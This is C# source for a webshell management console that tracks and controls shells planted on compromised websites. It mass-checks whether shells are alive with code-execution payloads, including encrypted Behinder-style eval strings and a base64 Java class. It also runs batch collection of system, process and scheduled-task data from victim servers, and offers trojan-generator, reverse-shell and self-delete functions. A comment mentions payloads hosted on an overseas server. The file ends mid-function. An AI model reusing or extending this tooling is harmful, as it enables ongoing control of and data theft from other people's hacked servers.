using C2.Business.CastleBravo.WebShellTool.SettingsDialog;
using C2.Core;
using C2.Utils;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{

    public partial class WebShellManageForm : Form
    {

        class CheckAliveResult
        {
            public bool done = false;
            public bool alive = false;
            public bool safeM = false;
            public CheckAliveResult(bool s = false)
            {
                safeM = s;
            }

        }

        enum ResetTypeEnum
        {
            重新开始,
            重新开始_境外站,
            继续上次,
            继续上次_境外,
            选中项验活,
            二刷不活
        }

        public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
        private int NumberOfAlive { get; set; }
        private int NumberOfHost { get => setOfHost.Count; }
        private int NumberOfIPAddress { get => setOfIPAddress.Count; }

        private int NumberOfThread { get => this.threadNumberButton.SelectedIndex + 1; }

        private HashSet<string> setOfIPAddress;
        private HashSet<string> setOfHost;

        List<WebShellTaskConfig> tasks = new List<WebShellTaskConfig>();
        readonly string configFFP = Path.Combine(Global.ResourcesPath, "WebShellConfig", "config.db");

        private ToolStripItem[] enableItems;
        private DateTime s; // 自动保存
        private SGType sgType;
        //

        private FindSet finder;

        // 并发验活缓存项
        // 加速原理: 开始前先根据验活场景构造待验活项缓存
        //           主线程从前往后逐项验活
        //           其他线程对缓存中记录从后往前N线程并发验活,并把结果记录入缓存
        //           主线程每次验活前,先查看是否在缓存中此项是否已经被验过了
        //           
        // 因为并发验活涉及到层层反馈结果到界面更新,这样设计,改动最小
        private Dictionary<WebShellTaskConfig, CheckAliveResult> cache;

        public WebShellManageForm()
        {
            InitializeComponent();
            InitializeToolStrip();
            InitializeOther();
            InitializeLock();
        }

        private void ResetSLabel()
        {
            ItemCountSLabel.Text = string.Format("共{0}项", LV.Items.Count);
            ProxyEnableSLabel.Text = "代理" + (Proxy.Enable ? "启用" : "关闭");
        }

        // 根据不同的场景设置加速缓存里的内容
        private void ResetCheckCache(ResetTypeEnum type)
        {
            cache.Clear();
            // 跳过初始几项
            for (int i = 10; i < LV.Items.Count; i++)
            {
                ListViewItem lvi = LV.Items[i];
                WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
                switch (type)
                {
                    case ResetTypeEnum.重新开始:
                        cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.重新开始_境外站:
                        cache.Add(task, new CheckAliveResult(true));
                        break;
                    case ResetTypeEnum.继续上次:
                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                            cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.继续上次_境外:
                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                            cache.Add(task, new CheckAliveResult(true));
                        break;
                    case ResetTypeEnum.选中项验活:
                        if (lvi.Selected)
                            cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.二刷不活:
                        if (lvi.SubItems[5].Text.Trim().In(new string[] { "×", "待" }))
                            cache.Add(task, new CheckAliveResult());
                        break;
                }
            }


            // 任务太少,不需要启动多线程
            if (cache.Count < NumberOfThread * 10)
                cache.Clear();
        }

        private void CheckAliveSpeedUpBackground()
        {
            for (int nt = 0; nt < NumberOfThread; nt++)
            {
                Task.Run(() =>
                {
                    int nr = 0;
                    foreach (var kv in cache)
                    {
                        if (actionNeedStop)
                            break;

                        if (nr++ % nt == 0)
                            continue;

                        WebShellTaskConfig task = kv.Key;
                        kv.Value.alive = CheckAliveOneTaskAsyn(task, kv.Value.safeM) == "√";
                        kv.Value.done = true;
                    }
                });
            }
        }
        private void InitializeOther()
        {
            setOfHost = new HashSet<string>();
            setOfIPAddress = new HashSet<string>();
            NumberOfAlive = 0;
            finder = new FindSet(LV);
            LV.ListViewItemSorter = new LVComparer();
            cache = new Dictionary<WebShellTaskConfig, CheckAliveResult>();
        }

        private void InitializeToolStrip()
        {
            // 批量验活时, 与其他菜单项互斥
            enableItems = new ToolStripItem[]
            {
                this.editDDB,
                this.proxySettingMenu,
                this.批量验活Menu,
                this.境外站验活Menu,
                this.二刷不活Menu,
                this.checkAliveDDB,
                this.trojanMenu,
                this.infoCollectionMenu,
                this.passwdBlastingMenuItem,
            };
            this.Size = new Size(1275, 500);
            this.threadNumberButton.SelectedIndex = 3;
        }
        private void InitializeLock()
        {
            if (IsLocked())
            {
                trojanMenu.Enabled = false;
                infoCollectionMenu.Enabled = false;
                //右键菜单
                EnterToolStripMenuItem.Enabled = false;
                SuscideMenuItem.Enabled = false;
                ReverseShellMenu.Enabled = false;
                msfMenu.Enabled = false;
                DDMenuItem.Enabled = false;
            }
        }
        private bool IsThreeGroup()
        {
            return ConfigUtil.IsTG();
        }

        private bool IsLocked()
        {
            if (IsThreeGroup() || File.Exists(ClientSetting.UnlockFilePath))
                UnlockButton.Enabled = false;
            return UnlockButton.Enabled;
        }
        
        public void FuctionUnlock()
        {
            trojanMenu.Enabled = true;
            infoCollectionMenu.Enabled = true;
            批量验活Menu.Enabled = true;
            二刷不活Menu.Enabled = true;
            //右键菜单
            EnterToolStripMenuItem.Enabled = true;
            SuscideMenuItem.Enabled = true;
            CheckAliveSelectedItemMenuItem.Enabled = true;
            ReverseShellMenu.Enabled = true;
            msfMenu.Enabled = true;
            DDMenuItem.Enabled = true;
            UnlockButton.Enabled = false;//按钮不可用
        }

        private void 添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            WebShellTaskConfig config = new AddWebShellForm().ShowDialog(ST.NowString());
            if (config == WebShellTaskConfig.Empty)
                return;

            LV.Items.Add(NewLVI(config));
            tasks.Add(config);
            SaveDB();
        }

        private void 批量添加ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddAllWebShellForm dialog = new AddAllWebShellForm();
            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            // 修复添加6万左右数据卡死的问题
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(dialog.Tasks));
            tasks.AddRange(dialog.Tasks);
            SaveDB();
        }

        private void RefreshTasks(bool create = true)
        {
            tasks.Clear();
            foreach (ListViewItem lvi in LV.Items)
            {
                WebShellTaskConfig config = create ? new WebShellTaskConfig(GetSubItemsTextArray(lvi)) : 
                    lvi.Tag as WebShellTaskConfig;
                // 针对删除菜单的优化,删除先置Empty后删除  
                if (config != WebShellTaskConfig.Empty)
                {
                    lvi.Tag = config; // 关联
                    tasks.Add(config);
                }         
            }
        }

        private string[] GetSubItemsTextArray(ListViewItem lvi)
        {
            List<string> array = new List<string>(lvi.SubItems.Count);
            for (int i = 0; i < lvi.SubItems.Count; i++)
                array.Add(lvi.SubItems[i].Text);
            return array.ToArray();
        }

        private void ClearAll()
        {
            tasks.Clear();
            RefreshLV();
            SaveDB();
        }

        private void SaveDB()
        {
            ResetSLabel();
            StaticItems();
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Create))
                    new BinaryFormatter().Serialize(stream, tasks);
            }
            catch { }
        }

        private void WebShellManageForm_Load(object sender, EventArgs e)
        {
            LoadDB();
            RefreshLV();
            ResetSLabel();
            StaticItems();
        }

        private void LoadDB()
        {
            try
            {
                using (Stream stream = File.Open(configFFP, FileMode.Open))
                    tasks = new BinaryFormatter().Deserialize(stream) as List<WebShellTaskConfig>;
            }
            catch { }
        }

        private void RefreshLV()
        {
            LV.Items.Clear();  // 不能删表头的clear方法
            using (GuarderUtil.WaitCursor)
                LV.Items.AddRange(NewLVIS(tasks));
        }

        private void RefreshBackColor()
        {
            foreach(ListViewItem lvi in LV.Items)
            {
                lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
                isAlertnatingRows = !isAlertnatingRows;
            }
        }

        static bool isAlertnatingRows = true;
        static readonly Color SingleRowColor = Color.FromArgb(255, 217, 225, 242);
        static readonly Color AltertnatingRowColor = Color.FromArgb(255, 208, 206, 206);
        private ListViewItem NewLVI(WebShellTaskConfig config)
        {
            ListViewItem lvi = new ListViewItem(config.CreateTime);
            lvi.SubItems.Add(config.Remark);
            lvi.SubItems.Add(config.Url);
            lvi.SubItems.Add(config.Password);
            lvi.SubItems.Add(config.TrojanType);
            lvi.SubItems.Add(config.Status);
            lvi.SubItems.Add(config.ClientVersion);
            lvi.SubItems.Add(config.ProbeInfo);
            lvi.SubItems.Add(config.IP);
            lvi.SubItems.Add(config.Country);
            lvi.SubItems.Add(config.Country2);
            lvi.SubItems.Add(config.DatabaseConfig);

            // 指针关联
            lvi.Tag = config;
            // 设置间隔行背景色
            lvi.BackColor = isAlertnatingRows ? SingleRowColor : AltertnatingRowColor;
            isAlertnatingRows = !isAlertnatingRows;
            return lvi;
        }

        private ListViewItem[] NewLVIS(IList<WebShellTaskConfig> tasks)
        {
            ListViewItem[] lvis = new ListViewItem[tasks.Count];
            for (int i = 0; i < lvis.Length; i++)
                lvis[i] = NewLVI(tasks[i]);
            return lvis;
        }

        private void EnterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            new WebShellDetailsForm(LV.SelectedItems[0].Tag as WebShellTaskConfig).ShowDialog();
        }

        private void RemoveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in LV.SelectedItems)
                lvi.Tag = WebShellTaskConfig.Empty;

            RefreshTasks(false);
            using (WaitCursor)
                SaveDB();
            using (new LayoutGuarder(LV))
                foreach (ListViewItem lvi in LV.SelectedItems)
                    lvi.Remove();
        }

        private void EditToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig old = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellTaskConfig cur = new AddWebShellForm().ShowDialog(old);

            if (cur == WebShellTaskConfig.Empty)
                return;

            LV.SelectedItems[0].Tag = cur;
            LV.SelectedItems[0].SubItems[1].Text = cur.Remark;         // 名称
            LV.SelectedItems[0].SubItems[2].Text = cur.Url;            // url
            LV.SelectedItems[0].SubItems[3].Text = cur.Password;       // 密码
            LV.SelectedItems[0].SubItems[4].Text = cur.TrojanType;     // 木马类型
            LV.SelectedItems[0].SubItems[5].Text = cur.Status;         // 木马状态
            LV.SelectedItems[0].SubItems[6].Text = cur.ClientVersion;  // 客户端版本
            LV.SelectedItems[0].SubItems[7].Text = cur.ProbeInfo;      // 后SG字段
            LV.SelectedItems[0].SubItems[8].Text = cur.IP;             // 目标IP
            LV.SelectedItems[0].SubItems[9].Text = cur.Country;        // 归属地
            LV.SelectedItems[0].SubItems[10].Text = cur.Country2;      // 归属地
            // 按道理不会出现索引越界
            tasks[tasks.IndexOf(old)] = cur;
            SaveDB();
        }
        private void LV_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            EditToolStripMenuItem_Click(sender, e);
        }

        private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // 复制当前的选中单元格到粘贴板
            if (this.LV.SelectedItems.Count == 0)
                return;

            StringBuilder sb = new StringBuilder();
            foreach (ListViewItem lvi in this.LV.SelectedItems)
            {
                for (int i = 0; i < lvi.SubItems.Count; i++)
                    sb.Append(lvi.SubItems[i].Text).Append(OpUtil.TabSeparator);
                sb.TrimEndT().AppendLine();
            }
            FileUtil.TryClipboardSetText(sb.ToString());
        }


        private void TrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            string type = (sender as ToolStripMenuItem).ToolTipText.Split('|')[0];
            new TrojanGeneratorForm(type).ShowDialog();
        }

        private void GodzillaTrojanGeneratorMenuItem_Click(object sender, EventArgs e)
        {
            new TrojanGeneratorForm("哥斯拉配套Trojan", true).ShowDialog();
        }


        private void CheckAliveSelectedItemMenuItem_Click(object sender, EventArgs e)
        {
            this.actionNeedStop = false;
            if (this.LV.SelectedItems.Count == 0)
                return;
            ResetProgressMenuValue(LV.SelectedItems.Count);
            ResetCheckCache(ResetTypeEnum.选中项验活);
            DoCheckAliveItems(LV.SelectedItems, false, false);
            RefreshTasks();
            SaveDB();
        }

        private void CheckAliveAll(bool skipAlive, bool safeMode)
        {
            DoCheckAliveItems(LV.Items, skipAlive, safeMode);
        }

        private void CheckAliveAllMenuItem_Click(object sender, EventArgs e)
        {
            // 清空加速缓存
            ResetCheckCache(ResetTypeEnum.重新开始);
            // 启动加速
            // CheckAliveSpeedUpBackground();
            DoCheckAliveAllMenuItemClick(false);
        }

        private bool actionNeedStop = false;

        private void CheckAliveStopMenu_Click(object sender, EventArgs e)
        {
            actionNeedStop = true;

        }

        private void SecondCheckAliveTaskStatus()
        {
            ResetProgressMenuValue(LV.Items.Count);

            foreach (ListViewItem lvi in LV.Items)
            {   // 没启用跳过尸体, 清空 或 死状态 清空
                if (lvi.SubItems[5].Text.In(new string[] { "×", "待" }))
                    lvi.SubItems[5].Text = "待";
                else
                    this.progressBar.Maximum--;
            }
            CheckAliveAll(true, false);
            EndCheckAlive();
        }

        private void DoCheckAliveAllMenuItemClick(bool safeMode)
        {   // 刷新前先强制清空
            ResetProgressMenuValue(LV.Items.Count);

            foreach (ListViewItem lvi in LV.Items)
                ClearAliveSubItems(lvi);

            CheckAliveAll(false, safeMode);
            EndCheckAlive();
        }

        private void DoCheckAliveContinue(bool safeMode)
        {
            ResetProgressMenuValue(CountStatusBlankItem());

            if (CountStatusBlankItem() == 0)
                progressMenu.Text = "完成";

            CheckAliveContinue(safeMode); 
            EndCheckAlive();
        }



        private void DoCheckAliveItems(IList items, bool skipAlive, bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in items)
                {
                    if (actionNeedStop)
                        break;
                    // 启用二刷
                    if (skipAlive && lvi.SubItems[5].Text != "待")
                        continue;
                    UpdateAliveItems(lvi, safeMode);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
            InitializeLock();//验活不影响功能加锁
        }
        private void CheckAliveContinue(bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in LV.Items)
                {
                    if (actionNeedStop)
                        break;
                    // 对留存的空状态验活
                    if (!lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                        continue;
                    UpdateAliveItems(lvi, safeMode);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
            InitializeLock();//验活不影响功能加锁
        }

        private void EndCheckAlive()
        {
            RefreshTasks();
            SaveDB();
        }

        private void CheckSavePoint()
        {
            TimeSpan gap = DateTime.Now - s;
            if (gap.TotalMinutes >= 5)
            {   // 5分钟保存一次
                RefreshTasks();
                SaveDB();
                s = DateTime.Now;
            }
        }

        private void ResetProgressMenuValue(int progressMaxValue)
        {
            this.progressMenu.Text = string.Empty;
            this.progressBar.Value = 0;
            this.progressBar.Maximum = progressMaxValue;
            this.actionNeedStop = false;
            this.NumberOfAlive = 0;
            this.setOfIPAddress.Clear();
            this.setOfHost.Clear();
        }

        private int CountStatusAliveItem()
        {
            int sum = 0;
            foreach (ListViewItem lvi in LV.Items)
                if (lvi.SubItems[5].Text == "√")
                    sum++;
            return sum;
        }

        private int CountStatusBlankItem()
        {
            int sum = 0;
            foreach (ListViewItem lvi in LV.Items)
                if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                    sum++;
            return sum;
        }

        private void UpdateAliveItems(ListViewItem lvi, bool safeMode = false)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            string rts = CheckAliveOneTaskSync(task, safeMode);

            if (rts == "√")
            {
                this.NumberOfAlive++;
                this.setOfHost.Add(NetUtil.GetHostByUrl(task.Url));
                this.setOfIPAddress.Add(task.IP);
            }
            lvi.SubItems[5].Text = rts;
            lvi.SubItems[8].Text = task.IP;
            lvi.SubItems[9].Text = task.Country;
            lvi.SubItems[10].Text = task.Country2;
            lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
        }
        private void UpdateProgress()
        {
            this.progressMenu.Text = string.Format("{0}/{1} {5} - 活 {2} - 站 {3} - IP {4}",
                ++progressBar.Value,
                progressBar.Maximum,
                NumberOfAlive,
                NumberOfHost,
                NumberOfIPAddress,
                progressBar.Value == progressBar.Maximum ? "完成" : string.Empty);
        }

        private static void ClearAliveSubItems(ListViewItem lvi)
        {
            lvi.SubItems[5].Text = string.Empty;
            lvi.SubItems[8].Text = string.Empty;
            lvi.SubItems[9].Text = string.Empty;
            lvi.SubItems[10].Text = string.Empty;
        }

        private string CheckAliveOneTaskAsyn(WebShellTaskConfig task, bool safeMode)
        {
            if (safeMode && RefreshIPAddress(task))
                return "跳";
            if (CheckAlive(task))
                return "√";

            return "×";
        }
        private string CheckAliveOneTaskSync(WebShellTaskConfig task, bool safeMode)
        {
            string status = "×";
            using (GuarderUtil.WaitCursor)
            {
                // safe模式下 跳过国内网站
                bool isChina = RefreshIPAddress(task);
                if (safeMode && isChina)
                    return "跳";

                // 我总结的print穿透WAF大法
                if (PostCheckAlive(task))
                    return "√";
            }
            return status;
        }

        private bool PostCheckAlive(WebShellTaskConfig task)
        {   
            // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
            return DoEventsWait(5, Task.Run(() => CheckAlive(task)));
        }


        private static bool DoEventsWait(int timeout, Task<bool> t)
        {
            // 代理慢, timeout富裕一些
            timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;
            int start = Environment.TickCount;

            while (Math.Abs(Environment.TickCount - start) < timeout * 1000)
            {
                Application.DoEvents();
                if (t.Wait(1000))
                    return t.Result;
            }
            return false;
        }

        private bool RefreshIPAddress(WebShellTaskConfig task)
        {
            // 二刷时直接利用上次IP结果,加速
            if (task.Status != "待")
            {
                Application.DoEvents();
                task.IP = NetUtil.GetHostAddresses(task.Url);
                Application.DoEvents();
                task.Country = NetUtil.IPQuery_WhoIs(task.IP);
                Application.DoEvents();
                task.Country2 = NetUtil.IPQuery_ChunZhen(task.IP);
                Application.DoEvents();
            }

            return NetUtil.IsChina(task.Country) || NetUtil.IsChina(task.Country2);
        }

        private bool CheckAlive(WebShellTaskConfig task)
        {
            try
            {
                string url = NetUtil.FormatUrl(task.Url);
                int seed = RandomUtil.RandomInt(31415000, 31415926);
                string result = string.Empty;
                List<string> payloads = GenWebshellPayload(task, seed);
                foreach (string payload in payloads)
                {
                    result = WebClientEx.Post(url, payload, 15000, Proxy);
                    if (task.TrojanType == "jspEval")
                        return result.Contains("black cloud");
                    if (result.Contains(seed.ToString()))
                        return true;
                }
                return false;
            }
            catch { return false; }

        }
        private string GenPayload(string trojanType, int seed)
        {
            switch (trojanType)
            {
                // 有些网站会直接回显,这里加入运算逻辑
                // 报文用减法运算,加号容易被url转码成空格
                case "phpEval":
                    return string.Format("print({0}-1);", seed + 1);
                case "aspEval":
                    return string.Format("response.write({0}-1)", seed + 1);
                case "aspxEval":
                     return string.Format("response.write({0}-1)", seed + 1);
                case "jspEval": 
                    return "yv66vgAAADQAQwoADgAoBwApCgACACoIACsLACwALQsALAAuCAAvCgAwADELACwAMgcAMwoACgA0CgAOADUHADYHADcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxQYXlsb2FkOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAARwY3R4AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHADYHADcHACkHADgHADMBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAPABABAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwAOQA6AQAXdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTgHADgMADsAPAwAPQA%2BAQALYmxhY2sgY2xvdWQHAD8MAEAAPAwAQQAQAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAQgAQDAAWABcBAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALZmx1c2hCdWZmZXIBAA9wcmludFN0YWNrVHJhY2UAIQANAA4AAAAAAAIAAQAPABAAAQARAAAALwABAAEAAAAFKrcAAbEAAAACABIAAAAGAAEAAAAFABMAAAAMAAEAAAAFABQAFQAAAAEAFgAXAAEAEQAAAMwAAgAFAAAAMyvAAAJNLLYAA04tEgS5AAUCAC25AAYBABIHtgAILbkACQEApwAKOgQZBLYACyortwAMrAABAAoAIwAmAAoAAwASAAAAJgAJAAAACAAFAAkACgANABIADgAdAA8AIwASACYAEAAoABEALQATABMAAAA0AAUAKAAFABgAGQAEAAAAMwAUABUAAAAAADMAGgAbAAEABQAuABwAHQACAAoAKQAeAB8AAwAgAAAAGQAC%2FwAmAAQHACEHACIHACMHACQAAQcAJQYAAQAmAAAAAgAn";
                default:
                    return string.Format("print({0}-1);", seed + 1);

            }
        }
        private List<string> GenWebshellPayload(WebShellTaskConfig task, int seed)
        {
            List<string> payloads = new List<string>();
            string pass = task.Password;
            // 默认按php算
            string payload = GenPayload(task.TrojanType, seed);

            if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
            {
                string bxPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
                payloads.Add(ClientSetting.AES128Encrypt(bxPayload, pass));
                payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass));
                if (Regex.IsMatch(pass, "[a-f0-9]{16}"))
                {
                    payloads.Add(ST.AES128CBCEncrypt(bxPayload, pass));
                    payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass, false));
                }                
                   
            }
            else if (task.TrojanType != "自动判断")
            {
                payloads.Add(pass + "=" + payload);
            }
            else
            {
                foreach (string type in Global.TrojanTypes)
                    payloads.Add(pass + "=" + GenPayload(type, seed));
            }
            return payloads;

        }
       
        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClearAll();
        }

        private void SuscideMenuItem_Click(object sender, EventArgs e)
        {
            if (this.LV.SelectedItems.Count == 0)
                return;

            WebShellTaskConfig config = LV.SelectedItems[0].Tag as WebShellTaskConfig;
            WebShellClient client = new WebShellClient(config.Url, config.Password, config.ClientVersion, config.DatabaseConfig);
            client.Suscide();
            RemoveToolStripMenuItem_Click(sender, e);
        }

        private void ProxyMenu_Click(object sender, EventArgs e)
        {
            Proxy = new ProxySettingForm(Proxy).ShowDialog();
            ResetSLabel();
        }

        private void SaveResultsMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "BCP文件|*.bcp";
            dialog.FileName = "D洞管理" + DateTime.Now.ToString("yyyyMMddHHmm") + ".bcp";

            if (dialog.ShowDialog() != DialogResult.OK)
                return;

            using (GuarderUtil.WaitCursor)
                SaveResultToLocal(dialog.FileName);
        }

        private void SaveResultToLocal(string path)
        {
            StreamWriter sw = new StreamWriter(path, false);
            try
            {
                List<string> tmpLists = new List<string>();
                foreach (ListViewItem lvi in LV.Items)
                {
                    tmpLists.Clear();
                    for (int i = 0; i < lvi.SubItems.Count; i++)
                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n", OpUtil.StringBlank));
                    sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                }
            }
            catch { }
            finally
            {
                if (sw != null)
                    sw.Close();
            }
        }

        private void SecondeCheckAliveMenu_Click(object sender, EventArgs e)
        {
            ResetCheckCache(ResetTypeEnum.二刷不活);
            SecondCheckAliveTaskStatus();
        }

        private void RefreshOtherMenu_Click(object sender, EventArgs e)
        {
            // 清空加速缓存
            ResetCheckCache(ResetTypeEnum.重新开始_境外站);
            DoCheckAliveAllMenuItemClick(true);
        }

        private void WebShellManageForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.actionNeedStop = true;
            using (GuarderUtil.WaitCursor)
            {
                RefreshTasks();
                SaveDB();
            }
        }

        private void StaticItems()
        {
            int dead = 0;
            int alive = 0;

            foreach (ListViewItem lvi in LV.Items)
            {
                switch (lvi.SubItems[5].Text)
                {
                    case "√":
                        alive++;
                        break;
                    case "×":
                        dead++;
                        break;
                }
            }
            StatusLabel.Text = string.Format("活 {0} - 死 {1}", alive, dead);
        }

        private void ClearScanResult()
        {
            foreach (ListViewItem lvi in LV.Items)
                lvi.SubItems[7].Text = string.Empty;
        }

        #region 后信息收集模块,该模块部分payload是存储在境外服务器103.43.17.9上的图片马
        //系统信息
        private void AllSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(false);
        }
        private void AliveSysInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.SystemInfo;
            BatchInfoColletion(true);
        }

        // 进程信息
        private void AllProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(false);
        }

        private void AliveProcessView_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ProcessView;
            BatchInfoColletion(true);
        }

        // 定时任务
        private void AllScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(false);
        }

        private void AliveScheduleTask_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.ScheduleTask;
            BatchInfoColletion(true);
        }

        // 地理位置部分
        private void AllLocationInfoMenuItem_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(false);
        }
        private void AliveLocationInfo_Click(object sender, EventArgs e)
        {
            this.sgType = SGType.LocationInfo;
            BatchInfoColletion(true);
        }

        

        private void DoCurrentItemTask()
        {
            this.actionNeedStop = false;
            ResetProgressMenuValue(LV.SelectedItems.Count);
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem item in LV.SelectedItems)
                {
                    if (actionNeedStop)
                        break;
                    SingleInfoCollection(item);
                    UpdateProgress();
                }
        }

        //公共函数部分
        private void BatchInfoColletion(bool checkAlive,int time = 60)
        {   // 刷新前先强制清空
            ResetProgressMenuValue(checkAlive ? CountStatusAliveItem() : LV.Items.Count);
            ClearScanResult();
            DoInfoCollectionTask(LV.Items, checkAlive, time);
            EndCheckAlive();
        }

        private void SelectedInfoColletion(int time = 60)
        {
            ResetProgressMenuValue(LV.SelectedItems.Count);
            ClearScanResult();
            DoInfoCollectionTask(LV.SelectedItems, false, time);
            EndCheckAlive();
        }
        private void DoInfoCollectionTask(IList items, bool checkAlive, int time)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in items)
                {
                    if (actionNeedStop)
                        break;
                    if (checkAlive && !lvi.SubItems[5].Text.Equals("√"))
                    {
                        lvi.SubItems[7].Text = "跳";
                        continue;
                    }
                    SingleInfoCollection(lvi, time);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
        }
        private void SingleInfoCollection(ListViewItem lvi, int time = 60)
        {
            WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
            lvi.SubItems[7].Text = "进行中";
            using (GuarderUtil.WaitCursor)
                DoEventsWait(time, Task.Run(() => PostInfoCollectionPayload(task)));
            lvi.SubItems[7].Text = task.ProbeInfo;
        }
        private bool PostInfoCollectionPayload(WebShellTaskConfig task)
        {
            try
            {
                string payload = string.Format(ClientSetting.PayloadDict[this.sgType], task.Password);
                if (this.sgType == SGType.UserTable)
                {
                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                    task.ProbeInfo = ClientSetting.ProcessingResults(ret, task.Url, ClientSetting.InfoProbeItems[this.sgType]);
                }
                else
                {
                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                    task.ProbeInfo = ProcessingResults(ret, task.Url);
                }

            }
            catch (Exception ex)
            {
                task.ProbeInfo = ex.Message;
            }
            return true;
        }
        
        private String ProcessingResults(string ret, string taskUrl)
        {
            Regex r0 = new Regex("QACKL3IO9P==(.+?)==QACKL3IO9P", RegexOptions.Singleline);
            Regex p0 = new Regex(@"((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}");  
            if (this.sgType == SGType.SuperPing)  //匹配ip
                return p0.Match(ret).Value.IsNullOrEmpty() ? "无结果" : p0.Match(ret).Value;     
            Match m0 = r0.Match(ret);
            if (!m0.Success)
